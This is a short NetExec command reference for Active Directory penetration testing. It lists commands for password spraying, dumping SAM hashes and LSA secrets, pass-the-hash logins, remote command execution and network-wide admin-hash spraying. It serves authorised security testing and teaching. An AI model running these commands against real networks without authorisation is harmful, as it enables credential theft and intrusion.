---
title: Netexec Command List
date: 2026-01-05
category: commands
enrich: false
tags: netexec, cybersecurity, command reference
description: Top 10 essential commands for netexec.
---

# NetExec (nxc) Command Guide

**NetExec** (formerly CrackMapExec) is the "Swiss Army Knife" of Active Directory pentesting. It interacts with SMB, LDAP, MSSQL, WinRM, and more.

## Top 10 Useful Commands

### 1. SMB Null Session Check
```bash
nxc smb 192.168.1.0/24 -u '' -p ''
```
**Explanation:** Scan a subnet for machines allowing Null (anonymous) authentication.

### 2. Password Spray
```bash
nxc smb 192.168.1.0/24 -u users.txt -p 'Welcome123!'
```
**Explanation:** Test one password against many users to avoid lockout.

### 3. Check Admin Access (Pwn3d)
```bash
nxc smb 192.168.1.0/24 -u user -p pass
```
**Explanation:** If successful, look for `(Pwn3d!)` in output, meaning you have Local Admin rights.

### 4. Dump Hashes (SAM)
```bash
nxc smb 10.10.10.10 -u admin -p pass --sam
```
**Explanation:** Dump local account hashes (requires Admin).

### 5. Dump LSA Secrets
```bash
nxc smb 10.10.10.10 -u admin -p pass --lsa
```
**Explanation:** Dump secrets like service account passwords or cached creds.

### 6. Pass The Hash
```bash
nxc smb 10.10.10.10 -u Administrator -H <NTLM_HASH>
```
**Explanation:** Authenticate using the specific hash instead of a password.

### 7. Execute Command
```bash
nxc smb 10.10.10.10 -u admin -p pass -x 'whoami'
```
**Explanation:** Run a cmd command on the target.

### 8. Spider Shares
```bash
nxc smb 10.10.10.10 -u user -p pass --spider sharename
```
**Explanation:** List files in a specific SMB share.

### 9. LDAP Recon
```bash
nxc ldap 10.10.10.10 -u user -p pass --bloodhound
```
**Explanation:** Gather BloodHound data via LDAP collection.

### 10. WinRM Check
```bash
nxc winrm 192.168.1.0/24 -u user -p pass
```
**Explanation:** Check if WinRM (Management) is accessible.

## The Most Powerful Command
```bash
nxc smb 192.168.1.0/24 -u Administrator -H <HASH> --local-auth -x "whoami"
```
**Explanation:** Spray a local admin hash across the network to find where else that admin password is reused (Administrator reuse is common).

